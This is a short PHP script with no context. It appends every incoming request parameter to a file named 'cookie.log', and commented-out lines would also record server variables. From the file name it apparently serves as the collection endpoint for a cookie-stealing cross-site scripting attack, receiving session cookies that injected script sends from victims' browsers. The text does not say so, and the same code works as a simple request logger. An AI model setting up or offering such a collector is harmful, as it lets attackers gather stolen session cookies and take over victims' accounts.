<?php
$myFile = "cookie.log";
$fh = fopen($myFile, 'a');
//fwrite($fh, serialize($_REQUEST).serialize($_SERVER));
//fwrite($fh, serialize($_REQUEST));
fwrite($fh, print_r($_REQUEST,TRUE)."\n");
fclose($fh);
?>
